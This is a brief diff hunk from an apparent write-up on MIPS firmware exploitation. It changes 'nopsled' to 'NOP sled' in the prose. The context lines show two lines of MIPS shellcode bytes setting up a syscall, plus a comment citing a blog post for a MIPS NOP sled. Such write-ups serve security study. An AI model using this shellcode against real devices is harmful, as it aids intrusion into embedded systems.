@@ -493,7 +493,7 @@ shellcode += b"\xab\x0f\x02\x24" # addiu;$v0, $zero, 0xfab
 shellcode += b"\x0c\x01\x01\x01" # syscall 0x40404\
 ```
 
-In the same blogpost a clever nopsled is highlighted, I used it too:
+In the same blogpost a clever NOP sled is highlighted, I used it too:
 
 ```Python
 # MIPS nopsled from https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/
